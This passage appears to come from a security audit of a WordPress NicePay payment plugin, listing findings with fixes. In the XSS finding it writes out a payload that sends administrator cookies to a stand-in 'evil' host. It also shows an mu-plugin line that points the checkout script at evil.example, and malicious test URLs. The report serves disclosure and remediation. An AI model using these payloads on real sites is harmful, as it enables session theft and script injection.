`$('<span>').text(x).html()` escapes `<`, `>` and `&` but **not** `"`, because a browser serialising a text node does not escape quotes — the wrong escaper for an attribute context. [templates/standalone-payment-form.php:314](../../templates/standalone-payment-form.php#L314) assigns a message straight into `innerHTML` with no escaping at all, while its sibling in [nicepay.js:81](../../assets/js/nicepay.js#L81) *does* escape — the two are inconsistent.

**Exploitation path.** Set the `msgstr` for "Enter reason for cancellation…" to `" onfocus="fetch('//evil/?c='+document.cookie)" autofocus x="`. It reaches `nicepayAdmin.i18n.cancelReasonPlaceholder` (localised at [class-nicepay-admin.php:83](../../admin/class-nicepay-admin.php#L83)), then line 80 renders the injected attributes, and `NicePayModal.open()` focuses that element 100 ms later — firing the payload the moment an administrator clicks Cancel on any transaction.

**Impact.** Admin-context XSS. This plugin is not on wordpress.org, so no automatic language pack applies today. All four shipped `.po` files were checked: the only `msgstr` containing a quote is the WooCommerce settings notice (`<a href=\"%s\">`), which does not reach any of these sinks — so nothing is triggered today. The `innerHTML` sink in the template is additionally a latent front-end XSS: it currently receives only static translated literals but it takes `resp.data.message` from an AJAX response, so the day any error message interpolates user input it becomes reflected XSS with no further code change.

**Recommendation.** Stop building HTML by concatenation. Create elements and assign `textContent` / use `.text()` and `.attr()`, which are context-correct by construction.

```js
// assets/js/nicepay-admin.js — replace the string-built input at line 80
var $input = $('<input>', { type: 'text', id: 'nicepay-modal-input', placeholder: opts.inputPlaceholder || '', autocomplete: 'off' });
// ...append $input into the built body instead of concatenating markup
```
```php
// templates/standalone-payment-form.php — replace line 314
var iconSpan = document.createElement('span');
iconSpan.className = 'nicepay-notice-icon';
iconSpan.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>';
var msgSpan = document.createElement('span');
msgSpan.textContent = message;
notice.appendChild(iconSpan);
notice.appendChild(msgSpan);
```

**Effort:** small.

---

### SECURITY-16 · 🔵 LOW · Raw `WP_Error` and PG failure messages rendered to anonymous users

**Files:** [includes/class-nicepay-return-handler.php:99-110](../../includes/class-nicepay-return-handler.php#L99), [216](../../includes/class-nicepay-return-handler.php#L216); [includes/class-nicepay-gateway.php:312](../../includes/class-nicepay-gateway.php#L312); [includes/class-nicepay-api.php:188](../../includes/class-nicepay-api.php#L188), [242](../../includes/class-nicepay-api.php#L242), [255](../../includes/class-nicepay-api.php#L255), [266](../../includes/class-nicepay-api.php#L266)

**Attacker capability:** none.

**Problem.** When approval fails, the standalone handler renders `$result->get_error_message()` directly on the public result page ([line 108](../../includes/class-nicepay-return-handler.php#L108) → [216](../../includes/class-nicepay-return-handler.php#L216)), and the WooCommerce handler appends it to the order status note. Those messages are either raw WordPress HTTP errors (cURL text including timeouts, DNS failures and proxy details) or the plugin's own four distinct strings — "Invalid approval URL.", "Failed to parse approval response.", "Missing signature in approval response.", "Signature verification failed." — each naming precisely which internal check tripped. The output *is* correctly `esc_html()`-escaped, so there is no injection risk.

**Impact.** Primarily a product-quality problem: an anonymous visitor sees infrastructure error text on a payment page at the worst possible moment, with no reference number and no guidance about whether they were charged. Secondarily the four distinct messages form a coarse oracle — POST `NextAppURL=https://evil.example/` and get "Invalid approval URL.", confirming the allowlist and its position in the flow; use a real dc1-api URL with a bogus AuthToken and get "Missing signature…" versus "Signature verification failed."

**Recommendation.** Split the audience. Show visitors one generic, reassuring message plus a correlation ID; log the specific `WP_Error` server-side against that ID; keep detailed text in the (admin-only) order note. Return the same generic message for every failure class so no oracle remains.

```php
// includes/class-nicepay-return-handler.php, replace lines 99-110
if ( is_wp_error( $result ) ) {
    $ref = strtoupper( substr( md5( $moid . microtime( true ) ), 0, 6 ) );
    nicepay_log( 'Standalone approval failed', array(
        'ref' => $ref, 'moid' => $moid,
        'code' => $result->get_error_code(), 'msg' => $result->get_error_message(),
    ), 'error' );
    if ( $transaction ) {
        nicepay_update_transaction( $transaction->id, array(
            'status' => 'failed', 'result_code' => 'NET_ERROR', 'result_msg' => $result->get_error_message(),
        ) );
    }
    $this->render_result_page( false, sprintf(
        /* translators: %s: support reference code */
        __( 'Your payment could not be completed. Reference: %s. If you were charged, please contact us with this reference.', 'nicepay-payment-gateway' ),
        $ref
    ) );
    return;
}
```

**Effort:** small.

---

### SECURITY-17 · 🔵 LOW · Eight settings registered with no `sanitize_callback`; an unexpected `nicepay_mode` fails **open** to live credentials

**Files:** [admin/class-nicepay-admin.php:100-109](../../admin/class-nicepay-admin.php#L100) (vs [112-121](../../admin/class-nicepay-admin.php#L112)); [includes/class-nicepay-api.php:23-24](../../includes/class-nicepay-api.php#L23), [217](../../includes/class-nicepay-api.php#L217), [309](../../includes/class-nicepay-api.php#L309), [364](../../includes/class-nicepay-api.php#L364)

**Attacker capability:** admin-equivalent — hardening, not a privilege boundary.

**Problem.** Eight of ten `register_setting()` calls omit `sanitize_callback` entirely (`nicepay_mode`, `nicepay_language`, `nicepay_currency`, `nicepay_charset`, `nicepay_test_mid`, `nicepay_test_merchant_key`, `nicepay_live_mid`, `nicepay_live_merchant_key`); only the two under `nicepay_payment` are sanitised. `nicepay_charset` is then concatenated straight into an outbound `Content-Type` header at three call sites, and the mode test is written as `=== 'test'`:

```php
// includes/class-nicepay-api.php:23-24
$this->is_test_mode = ( get_option( 'nicepay_mode', 'test' ) === 'test' );
$this->charset      = get_option( 'nicepay_charset', 'utf-8' );
// includes/class-nicepay-api.php:217 (also 309, 364)
'Content-Type' => 'application/x-www-form-urlencoded; charset=' . $this->charset,
```

**Impact.** The concrete actionable defect is the **fail-open mode test**: `wp option update nicepay_mode production`, an import, or a migration script writing an unexpected value silently switches the plugin to **live** credentials while the settings dropdown shows neither option selected. The unvalidated `nicepay_charset` header concatenation is a hardening gap whose exploitability depends on transport-level header validation, which was not verified.

**Recommendation.** Give every registered setting an explicit `sanitize_callback` that allowlists its permitted values. Independently and most importantly, invert the mode test so an unknown value fails **safe**. Note the merchant-key settings should *not* simply get `sanitize_text_field` — see SECURITY-11, where the correct callback is "empty means unchanged".

```php
$allowlist = function ( array $allowed, $fallback ) {
    return function ( $value ) use ( $allowed, $fallback ) {
        $value = is_scalar( $value ) ? (string) $value : '';
        return in_array( $value, $allowed, true ) ? $value : $fallback;
    };
};
register_setting( 'nicepay_general', 'nicepay_mode',     array( 'sanitize_callback' => $allowlist( array( 'test', 'live' ), 'test' ) ) );
register_setting( 'nicepay_general', 'nicepay_language', array( 'sanitize_callback' => $allowlist( array( 'KO', 'EN', 'CN' ), 'KO' ) ) );
register_setting( 'nicepay_general', 'nicepay_currency', array( 'sanitize_callback' => $allowlist( array( 'KRW', 'USD' ), 'KRW' ) ) );
register_setting( 'nicepay_general', 'nicepay_charset',  array( 'sanitize_callback' => $allowlist( array( 'utf-8', 'euc-kr' ), 'utf-8' ) ) );
register_setting( 'nicepay_api', 'nicepay_test_mid', array( 'sanitize_callback' => 'sanitize_text_field' ) );
register_setting( 'nicepay_api', 'nicepay_live_mid', array( 'sanitize_callback' => 'sanitize_text_field' ) );

// includes/class-nicepay-api.php:23 — fail safe on an unexpected mode value
$this->is_test_mode = ( 'live' !== get_option( 'nicepay_mode', 'test' ) );
```

**Spec:** §4 (CharSet: `utf-8` / `euc-kr` only). **Effort:** trivial.

---

### SECURITY-18 · 🔵 LOW · `ajax_cancel_transaction` binds its nonce to a POSTed `id` but acts on a POSTed `tid`

**Files:** [admin/class-nicepay-transactions.php:180-237](../../admin/class-nicepay-transactions.php#L180) (nonce [186](../../admin/class-nicepay-transactions.php#L186), lookup [191](../../admin/class-nicepay-transactions.php#L191), cancel [208](../../admin/class-nicepay-transactions.php#L208))

**Attacker capability:** administrator — so not a privilege-boundary crossing.

**Problem.**

```php
// admin/class-nicepay-transactions.php:181-186
$id  = isset( $_POST['id'] ) ? (int) $_POST['id'] : 0;
$tid = isset( $_POST['tid'] ) ? sanitize_text_field( wp_unslash( $_POST['tid'] ) ) : '';
if ( ! current_user_can( 'manage_options' ) || ! wp_verify_nonce( $nonce, 'nicepay_cancel_' . $id ) ) {
// admin/class-nicepay-transactions.php:191 — looked up by tid, not by the id the nonce covers
$transaction = nicepay_get_transaction_by_tid( $tid );
// admin/class-nicepay-transactions.php:208 — $partial omitted, so PartialCancelCode is always '0'
$result = $api->request_cancel( $tid, $cancel_amount, $reason, $transaction->moid );
```

The two identifiers are never cross-checked, so a nonce minted for row 5 authorises a cancel against any TID. The handler also never inspects `$transaction->status`, and always issues a **full** cancel using `$transaction->amount` regardless of any partial refund already taken through WooCommerce.

**Impact.** The privilege impact is nil — the capability check runs first and an administrator may already cancel anything. The cost is integrity: the nonce is not actually protecting the operation it appears to protect, and the missing state check permits duplicate cancel calls. Per spec §9, repeat cancels against an already-cancelled TID fail, and 2nd-and-later partial cancels must use `OTID` — which this code never captures or sends. Practically: an admin double-clicks Cancel and two full-cancel requests go out with no state guard to stop the second.

**Recommendation.** Look the transaction up by the integer `$id` that the nonce actually covers, then use `$transaction->tid` from the database. Refuse to proceed unless the status is `paid` or `waiting`. Pass an explicit `$partial` flag. Additionally — spec §9 requires the cancel request's `Moid` to be a merchant-issued **unique cancel order number**, not the original payment Moid; generate a fresh one and persist the returned `OTID`.

```php
if ( ! current_user_can( 'manage_options' ) || ! wp_verify_nonce( $nonce, 'nicepay_cancel_' . $id ) ) {
    wp_send_json_error( array( 'message' => __( 'Unauthorized.', 'nicepay-payment-gateway' ) ), 403 );
}
global $wpdb;
$table       = $wpdb->prefix . 'nicepay_transactions';
$transaction = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$table} WHERE id = %d", $id ) );
if ( ! $transaction || ! $transaction->tid ) {
    wp_send_json_error( array( 'message' => __( 'Transaction not found.', 'nicepay-payment-gateway' ) ), 404 );
}
if ( ! in_array( $transaction->status, array( 'paid', 'waiting' ), true ) ) {
    wp_send_json_error( array( 'message' => __( 'This transaction can no longer be cancelled.', 'nicepay-payment-gateway' ) ), 409 );
}
$tid         = $transaction->tid;                                              // authoritative
$cancel_moid = 'CX_' . $transaction->id . '_' . bin2hex( random_bytes( 6 ) );  // unique cancel order no, spec §9
```

**Spec:** §9. **Effort:** small.

---

### SECURITY-19 · 🔵 LOW · Result page sends no cache/robots/referrer headers, always returns HTTP 200, and neither endpoint requires HTTPS

**Files:** [includes/class-nicepay-return-handler.php:26](../../includes/class-nicepay-return-handler.php#L26), [164-176](../../includes/class-nicepay-return-handler.php#L164), [218-238](../../includes/class-nicepay-return-handler.php#L218); [includes/class-nicepay-gateway.php:216](../../includes/class-nicepay-gateway.php#L216)

**Attacker capability:** network-adjacent, or an intermediary cache.

**Problem.** `render_result_page()` emits a complete standalone HTML document containing the TID, amount and — for VBANK — the bank name, virtual account number and deadline ([226-237](../../includes/class-nicepay-return-handler.php#L226)), with no `nocache_headers()`, no `X-Robots-Tag: noindex`, no `Referrer-Policy` and no `status_header()`. A repo-wide grep for `is_ssl`, `nocache_headers`, `X-Robots-Tag` and `status_header` returns **zero hits**. Neither return endpoint requires `is_ssl()`. The WooCommerce handler also never checks `REQUEST_METHOD` (the standalone one does at [line 26](../../includes/class-nicepay-return-handler.php#L26), but reads `$_SERVER['REQUEST_METHOD']` without `isset()` or `wp_unslash()`).

**Impact.** Modest but cheap to fix. Payment-result pages carrying virtual account numbers should never be cacheable by an intermediary, retained in bfcache, or indexable; the absence of a referrer policy leaks the full result URL in the `Referer` header of any outbound link. Always returning 200 defeats uptime monitoring and WAF rules on the failure path. Lack of HTTPS enforcement means a downgrade or misconfigured host silently exposes the auth material the entire signature scheme depends on. [CONFIGURATION.md:401-408](../../docs/CONFIGURATION.md#L401) already tells merchants HTTPS is required — the code does not enforce it for inbound.

**Recommendation.**

```php
// includes/class-nicepay-return-handler.php, at the top of render_result_page()
if ( ! headers_sent() ) {
    nocache_headers();
    status_header( $success ? 200 : 402 );
    header( 'X-Robots-Tag: noindex, nofollow', true );
    header( 'Referrer-Policy: no-referrer', true );
    header( 'X-Frame-Options: DENY', true );
}

// includes/class-nicepay-return-handler.php:26 — defensive read
$method = isset( $_SERVER['REQUEST_METHOD'] ) ? strtoupper( sanitize_text_field( wp_unslash( $_SERVER['REQUEST_METHOD'] ) ) ) : '';
if ( 'POST' !== $method ) { ... }

// includes/class-nicepay-gateway.php, at the top of handle_return()
if ( ! isset( $_SERVER['REQUEST_METHOD'] ) || 'POST' !== strtoupper( sanitize_text_field( wp_unslash( $_SERVER['REQUEST_METHOD'] ) ) ) ) {
    wp_die( esc_html__( 'Invalid request method.', 'nicepay-payment-gateway' ), 'NicePay Error', array( 'response' => 405 ) );
}
```

**Effort:** trivial.

---

### SECURITY-20 · 🔵 LOW · `validate_nicepay_url()` does not normalise host case and ignores port and path; `NICEPAY_CANCEL_URL` bypasses it entirely

**Files:** [includes/class-nicepay-api.php:128-152](../../includes/class-nicepay-api.php#L128), [360](../../includes/class-nicepay-api.php#L360)

**Attacker capability:** no demonstrated attack — the control is fail-closed.

**Problem.**

```php
// includes/class-nicepay-api.php:140-152
private function validate_nicepay_url( $url ) {
    $parsed = wp_parse_url( $url );
    if ( ! $parsed || empty( $parsed['scheme'] ) || empty( $parsed['host'] ) ) { return false; }
    if ( $parsed['scheme'] !== 'https' ) { return false; }
    return in_array( $parsed['host'], self::$allowed_hosts, true );
}
```

The allowlist is all-lowercase ([130-135](../../includes/class-nicepay-api.php#L130)) and `wp_parse_url()` does not normalise host case; `$parsed['port']` and `$parsed['path']` are never inspected. Additionally, [line 360](../../includes/class-nicepay-api.php#L360) is the one outbound call that never goes through this validator at all.

**Impact.** Not exploitable as written. Residual risks: (a) a non-443 port on an allowed host is accepted, and any path on an allowed host is accepted, so a `NextAppURL` pointing at `cancel_process.jsp` instead of `pay_process.jsp` would receive the approval body; (b) a hypothetical availability issue if NICEPAY ever returned a mixed-case host — speculative, since the spec lists both endpoints in lowercase. A grep over `tests/` for `validate_nicepay_url` returns nothing: **this security control has zero test coverage.**

**Recommendation.** Lowercase and strip trailing dots from the parsed host; reject any explicit port other than 443; pin the path to the two documented endpoints (spec §5). Route `NICEPAY_CANCEL_URL` through the same validator. Then add the unit tests in SECURITY-26.

```php
private function validate_nicepay_url( $url, array $allowed_paths = array( '/webapi/pay_process.jsp', '/webapi/cancel_process.jsp' ) ) {
    $parsed = wp_parse_url( $url );
    if ( ! $parsed || empty( $parsed['scheme'] ) || empty( $parsed['host'] ) ) { return false; }
    if ( 'https' !== strtolower( $parsed['scheme'] ) ) { return false; }
    if ( isset( $parsed['port'] ) && 443 !== (int) $parsed['port'] ) { return false; }
    $host = rtrim( strtolower( $parsed['host'] ), '.' );
    if ( ! in_array( $host, self::$allowed_hosts, true ) ) { return false; }
    $path = isset( $parsed['path'] ) ? $parsed['path'] : '';
    return in_array( $path, $allowed_paths, true );
}
```

**Spec:** §5, §2 (port 443). **Effort:** trivial.

---

### SECURITY-21 · 🔵 LOW · Endpoint and key constants use bare `define()` with no `defined()` guard

**Files:** [nicepay-payment-gateway.php:22-34](../../nicepay-payment-gateway.php#L22), [281-287](../../nicepay-payment-gateway.php#L281); [includes/class-nicepay-api.php:360](../../includes/class-nicepay-api.php#L360)

**Attacker capability:** ability to drop a file in `wp-content/mu-plugins` — i.e. post-compromise persistence, so this is defence in depth rather than an entry point.

**Problem.** All ten constants — including `NICEPAY_JS_URL`, `NICEPAY_CANCEL_URL` and `NICEPAY_TEST_MERCHANT_KEY` — are declared with unguarded `define()`. PHP keeps the **first** definition and emits a warning for the second, and mu-plugins load before regular plugins.

**Impact.** Redefining `NICEPAY_JS_URL` injects attacker-controlled JavaScript into every checkout and payment page (it is passed straight to `wp_enqueue_script` at [line 283](../../nicepay-payment-gateway.php#L283)). Redefining `NICEPAY_CANCEL_URL` redirects every cancel/refund request — carrying MID and SignData — to an arbitrary host, bypassing `validate_nicepay_url()` entirely since that constant is never passed through it.

```php
// a single mu-plugin line wins over nicepay-payment-gateway.php:29
<?php define('NICEPAY_JS_URL','https://evil.example/pgweb.js');
```

**Recommendation.** Treat the endpoint constants as immutable plugin data — `private const` class constants on `NicePay_API` — or at minimum route `NICEPAY_CANCEL_URL` through `validate_nicepay_url()` before use. That last part costs three lines and closes the one outbound path with no allowlist check at all.

```php
if ( ! $this->validate_nicepay_url( NICEPAY_CANCEL_URL, array( '/webapi/cancel_process.jsp' ) ) ) {
    nicepay_log( 'Cancel endpoint failed allowlist validation', NICEPAY_CANCEL_URL );
    return new WP_Error( 'nicepay_url_error', __( 'Invalid cancel endpoint.', 'nicepay-payment-gateway' ) );
}
$response = wp_remote_post( NICEPAY_CANCEL_URL, $this->request_args( $params ) );
```

**Effort:** trivial.

---

### SECURITY-22 · 🔵 LOW · ⚠️ *needs confirmation* · Outbound calls follow HTTP redirects; connect and read share a 30-second timeout

**Files:** [includes/class-nicepay-api.php:213-220](../../includes/class-nicepay-api.php#L213), [305-312](../../includes/class-nicepay-api.php#L305), [360-367](../../includes/class-nicepay-api.php#L360)

**Attacker capability:** anyone who can cause an allowlisted NICEPAY host to emit a 3xx — a PG-side misconfiguration, operator error, or compromise. Not attacker-controllable in normal operation.

**Problem (confirmed).** All three `wp_remote_post()` calls pass only `timeout`, `sslverify`, `headers` and `body`:

```php
// includes/class-nicepay-api.php:213-220 (identical at 305-312 and 360-367)
$response = wp_remote_post( $next_app_url, array(
    'timeout'   => 30,
    'sslverify' => true,
    'headers'   => array( 'Content-Type' => 'application/x-www-form-urlencoded; charset=' . $this->charset ),
    'body'      => $params,
) );
```

`redirection` is left at WordPress's default of **5**, so a 3xx causes the request to be reissued to whatever `Location` names, and `validate_nicepay_url()` is not consulted on the redirect target. No `user-agent` is set. Spec §2 mandates a 5-second connection timeout with a 30-second read timeout; a single `timeout => 30` gives both 30 seconds.

**Needs confirmation.** Whether the POST body (MID + AuthToken + SignData) is **replayed** to the redirect target depends on the status code and on the `WpOrg\Requests` redirect implementation. Browsers convert 301/302 POSTs to GET but Requests does not necessarily follow that convention; this was not verified by execution. A GET to an attacker host is certain; body replay is not.

**Impact.** The redirect setting is the security-relevant one: it converts any redirect-response bug at the PG edge into a request to an arbitrary host, bypassing the SSRF allowlist. The timeout setting is an availability one: with connect and read both at 30s, an unreachable PG holds a PHP worker for 30 seconds per request — and both return endpoints are unauthenticated, so that is the multiplier for the worker-exhaustion path in SECURITY-08.

**Recommendation.** Add `'redirection' => 0` to all three calls, set an identifying user-agent, and extract the shared array into one `request_args()` helper so the three sites cannot drift. **Do not** simply add a `connect_timeout` key to the `wp_remote_post()` args — `WP_Http::request()` builds its transport options from a fixed key list and will silently ignore it. Use the `http_api_curl` filter instead, or accept the vendor deviation and document it.

```php
private function request_args( array $params ) {
    return array(
        'timeout'     => 30,   // read timeout, per spec §2
        'redirection' => 0,    // never follow a redirect away from the allowlisted host
        'sslverify'   => true,
        'httpversion' => '1.1',
        'user-agent'  => 'NicePay-WP/' . NICEPAY_VERSION . '; ' . home_url( '/' ),
        'headers'     => array( 'Content-Type' => 'application/x-www-form-urlencoded; charset=' . $this->charset ),
        'body'        => $params,
    );
}

// connect timeout (spec §2) must go through the transport filter, not the args array:
add_filter( 'http_api_curl', function ( $handle, $r, $url ) {
    if ( false !== strpos( $url, '.nicepay.co.kr' ) ) {
        curl_setopt( $handle, CURLOPT_CONNECTTIMEOUT, 5 );
    }
    return $handle;
}, 10, 3 );
```

**Spec:** §2 (connection 5s, receive 30s). **Effort:** trivial.

---

### SECURITY-23 · 🔵 LOW · An unused nonce with a mismatched action is localised on every payment page; every AJAX failure returns HTTP 200

**Files:** [nicepay-payment-gateway.php:300](../../nicepay-payment-gateway.php#L300), [314-317](../../nicepay-payment-gateway.php#L314), and the `wp_send_json_error` sites at [318](../../nicepay-payment-gateway.php#L318)/[329](../../nicepay-payment-gateway.php#L329)/[350](../../nicepay-payment-gateway.php#L350)/[369](../../nicepay-payment-gateway.php#L369)/[375](../../nicepay-payment-gateway.php#L375)/[412](../../nicepay-payment-gateway.php#L412)/[448](../../nicepay-payment-gateway.php#L448); [assets/js/nicepay.js:37](../../assets/js/nicepay.js#L37), [54](../../assets/js/nicepay.js#L54), [61](../../assets/js/nicepay.js#L61); [templates/standalone-payment-form.php:305](../../templates/standalone-payment-form.php#L305)

**Attacker capability:** none — a maintenance hazard, not an attack.

**Problem.** `enqueue_payment_assets()` localises `'nonce' => wp_create_nonce( 'nicepay_payment' )`, but `ajax_init_payment()` verifies the action `'nicepay_init_payment'`, and the nonce actually used is minted inline in the template. The three `nicepayParams` reads in `assets/js/nicepay.js` are all `.i18n`, so **the localised nonce is never sent anywhere**. Separately, every `wp_send_json_error()` call omits the status-code argument, so authorisation failures return HTTP 200.

**Impact.** No exploitable consequence, but the codebase contains two different nonce actions for one endpoint and the one that *looks* authoritative (localised alongside `ajaxUrl` and `returnUrl`) is inert. Anyone wiring a new caller to `nicepayParams.nonce` produces a silently failing endpoint. The HTTP-200-on-failure pattern also defeats monitoring, WAF rules and jQuery `.fail()` handlers — the admin JS at [nicepay-admin.js:180](../../assets/js/nicepay-admin.js#L180) and [236](../../assets/js/nicepay-admin.js#L236) has `.fail()` branches that can never fire for an authorisation rejection.

**Recommendation.** Fix the localised nonce's action and have the template read `nicepayParams.nonce` so there is exactly one source of truth (this also interacts with SECURITY-07). Pass explicit status codes to every `wp_send_json_error()`: 403 authorisation, 400 validation, 404 not-found, 429 rate limit. Prefer `check_ajax_referer( $action, 'nonce' )` for admin handlers, which dies with the correct status automatically.

```php
// nicepay-payment-gateway.php enqueue_payment_assets()
'nonce' => wp_create_nonce( 'nicepay_init_payment' ),

// templates/standalone-payment-form.php:305 — use the single localised value
xhr.send('action=nicepay_init_payment&nonce=' + encodeURIComponent(nicepayParams.nonce) + '&…');

wp_send_json_error( array( 'message' => __( 'Unauthorized.', 'nicepay-payment-gateway' ) ), 403 );
wp_send_json_error( array( 'message' => __( 'Invalid payment amount.', 'nicepay-payment-gateway' ) ), 400 );
```

**Effort:** trivial.

---

### SECURITY-24 · 🔵 LOW · `nicepay_saved_shortcodes` is an unbounded autoloaded option; presets are deletable; both write loops index `$sc['id']` unguarded

**Files:** [nicepay-payment-gateway.php:162](../../nicepay-payment-gateway.php#L162), [399-432](../../nicepay-payment-gateway.php#L399), [443-460](../../nicepay-payment-gateway.php#L443); [includes/nicepay-functions.php:428-435](../../includes/nicepay-functions.php#L428)

**Attacker capability:** administrator — not a boundary crossing. All three write paths are correctly gated on `manage_options` plus a nonce.

**Problem.**

```php
// nicepay-payment-gateway.php:162 — no $autoload argument
add_option( 'nicepay_saved_shortcodes', nicepay_get_default_presets() );

// includes/nicepay-functions.php:429-433 — writes on READ, reachable from an anonymous shortcode render
$shortcodes = get_option( 'nicepay_saved_shortcodes', null );
if ( $shortcodes === null ) {
    $shortcodes = nicepay_get_default_presets();
    update_option( 'nicepay_saved_shortcodes', $shortcodes );
}

// nicepay-payment-gateway.php:402-403 and 454-456 — unguarded index, no is_preset check
foreach ( $shortcodes as &$sc ) { if ( $sc['id'] === $edit_id ) {
$shortcodes = array_values( array_filter( $shortcodes, function ( $sc ) use ( $id ) { return $sc['id'] !== $id; } ) );
```

Since WordPress 6.6 the effective default for `add_option()`'s `$autoload` is `'auto'`, which still autoloads options below ~150 KB — so the option is autoloaded in practice on both old and new WordPress.

**Impact.** Performance and robustness. An autoloaded option that grows without bound is a well-known WordPress performance failure mode, and it is deserialised on every anonymous page view where it is not needed. The missing `isset()` guards mean a partially corrupted option produces PHP warnings on both the save and delete paths, and the missing `is_preset` guard makes an ordinary admin action irreversible — the four seeded presets ([nicepay-functions.php:343](../../includes/nicepay-functions.php#L343)/[362](../../includes/nicepay-functions.php#L362)/[381](../../includes/nicepay-functions.php#L381)/[400](../../includes/nicepay-functions.php#L400)) can be removed with no restore path short of reactivating the plugin.

**Recommendation.**

```php
// nicepay-payment-gateway.php set_default_options()
add_option( 'nicepay_saved_shortcodes', nicepay_get_default_presets(), '', 'no' );

// ajax_save_shortcode(), before appending a new entry
if ( ! $edit_id && count( $shortcodes ) >= 200 ) {
    wp_send_json_error( array( 'message' => __( 'Shortcode limit reached (200). Delete unused shortcodes first.', 'nicepay-payment-gateway' ) ), 400 );
}

// ajax_delete_shortcode(), protect presets and guard the index
$shortcodes = array_values( array_filter( $shortcodes, function ( $sc ) use ( $id ) {
    if ( ! isset( $sc['id'] ) ) { return false; }
    if ( ! empty( $sc['is_preset'] ) && $sc['id'] === $id ) { return true; } // presets are not deletable
    return $sc['id'] !== $id;
} ) );
```

Add a one-time `wp_set_option_autoload()` migration on upgrade, and a "Restore default presets" button on the Shortcodes tab. **Effort:** small.

---

### SECURITY-25 · 🔵 LOW · Documented clone-install path places `.git/` and unguarded test files under the webroot

**Files:** [README.md:31-37](../../README.md#L31); [tests/bootstrap/bootstrap.php:9](../../tests/bootstrap/bootstrap.php#L9); `tests/unit/*.php`, [tests/bootstrap/wp-stubs.php](../../tests/bootstrap/wp-stubs.php)

**Attacker capability:** none.

**Problem.** README's first install instruction is `git clone …` followed by "Upload the `nicepay-payment-gateway` folder to `/wp-content/plugins/`". That places `.git/`, `tests/`, `composer.json`, `phpunit.xml` and the workflow files under the document root. A scripted check across all 16 PHP files confirms **five of six** under `tests/` have no `ABSPATH` guard (missing in `NicePayFunctionsTest.php`, `NicePaySignatureIntegrationTest.php`, `NicePayApiTest.php`, `NicePayResultCodeTest.php`, `wp-stubs.php`); only `tests/bootstrap/bootstrap.php` effectively has one, and only because it defines the constant itself.

**Impact.** `.git/` under the webroot is directly downloadable on most default server configs. Because the repository is public on GitHub, a dumped `.git/` discloses nothing not already published — no credentials, no keys (the merchant key lives in the options table). The residual exposure is **absolute-path disclosure**: requesting `tests/bootstrap/bootstrap.php` triggers `require_once __DIR__ . '/../../vendor/autoload.php'` on a path that does not exist in a clone (`vendor/` is gitignored), producing a fatal error that prints the server's filesystem path; the `tests/unit/*.php` files fatal on the missing `PHPUnit\Framework\TestCase` class the same way.

**Credit:** [`.github/workflows/release.yml`](../../.github/workflows/release.yml) builds the ZIP by explicit copy list (`admin/`, `assets/`, `includes/`, `templates/`, `languages/`, the main file, README, LICENSE, CHANGELOG) — `tests/` and `.git/` are correctly excluded from the release artifact. The exposure comes only from the documented clone path.

**Recommendation.** Make the release ZIP the primary documented install method and demote the clone instruction to a "For development" section that explicitly says never to clone into a production webroot. Add `if ( ! defined( 'ABSPATH' ) && ! defined( 'PHPUNIT_COMPOSER_INSTALL' ) ) { exit; }` to the five unguarded test files. Ship a `.htaccess` in `tests/` denying all access, and note in CONTRIBUTING.md that nginx users need an equivalent location block. **Effort:** trivial.

---

### SECURITY-26 · 🔵 LOW · No test coverage for the SSRF allowlist or log redaction; no static analysis or lockfile in CI

**Files:** [.github/workflows/tests.yml:60-79](../../.github/workflows/tests.yml#L60); [composer.json:14-18](../../composer.json#L14); [.gitignore:26](../../.gitignore#L26)

**Category:** DX.

**Problem.** The test suite covers signature computation well — `NicePaySignatureIntegrationTest.php` pins the preimages against the vendor's worked examples. But a grep over `tests/` shows **zero references** to `validate_nicepay_url` or `redact_for_log`, the two security controls most likely to be quietly weakened by a refactor. CI runs `php -l` and PHPUnit only:

```yaml
# .github/workflows/tests.yml:77-79 — the entire lint job
find . -name "*.php" -not -path "./vendor/*" -not -path "./tests/*" -print0 | xargs -0 -n1 php -l
```

```json
// composer.json:14-18 — no static analysis
"require-dev": { "phpunit/phpunit": "^9.6", "brain/monkey": "^2.6", "mockery/mockery": "^1.6" }
```

`.gitignore:26` excludes `composer.lock`, so dev dependency versions are not reproducible between CI and contributors.

**Impact.** The controls this review found to be *correct* — the allowlist, the `hash_equals()` usage, the escaping in the transactions list table — have nothing pinning them. A future contributor could relax `validate_nicepay_url` to `strpos( $url, 'nicepay.co.kr' ) !== false` (which `https://nicepay.co.kr.evil.com/` satisfies) and every check in CI would go green. `WordPress.Security.EscapeOutput`, `WordPress.Security.NonceVerification` and `WordPress.Security.ValidatedSanitizedInput` would have flagged several findings in this report automatically.

**Recommendation.** Add `squizlabs/php_codesniffer` + `wp-coding-standards/wpcs` to require-dev with a `phpcs.xml` enabling at minimum the `WordPress.Security` ruleset, and a `composer lint:php` step in CI. Commit `composer.lock` — a WordPress plugin is an application, not a library. Add unit tests for `validate_nicepay_url()` and `redact_for_log()` using reflection.

```php
// tests/unit/NicePayUrlValidationTest.php
public function test_rejects_lookalike_and_malformed_hosts(): void {
    $m = new ReflectionMethod( NicePay_API::class, 'validate_nicepay_url' );
    $m->setAccessible( true );
    $api = new NicePay_API();
    foreach ( array(
        'https://nicepay.co.kr.evil.com/webapi/pay_process.jsp',
        'https://dc1-api.nicepay.co.kr@evil.com/webapi/pay_process.jsp',
        'https://dc1-api.nicepay.co.kr./webapi/pay_process.jsp',
        'https://dc1-api.nicepay.co.kr:8443/webapi/pay_process.jsp',
        'http://dc1-api.nicepay.co.kr/webapi/pay_process.jsp',
        'https://dc1-api.nicepay.co.kr/../../etc/passwd',
    ) as $bad ) {
        $this->assertFalse( $m->invoke( $api, $bad ), "should reject: {$bad}" );
    }
    $this->assertTrue( $m->invoke( $api, 'https://dc1-api.nicepay.co.kr/webapi/pay_process.jsp' ) );
}
```

**Effort:** small.

---

### SECURITY-27 · 🔵 LOW · Security documentation asserts guarantees the code does not provide

**Files:** [docs/ARCHITECTURE.md:351](../../docs/ARCHITECTURE.md#L351), [388-389](../../docs/ARCHITECTURE.md#L388); [README.md:204-208](../../README.md#L204)

**Category:** spec conformance.

**Problem.** Three claims are not true as written:

| Doc claim | Reality |
|---|---|
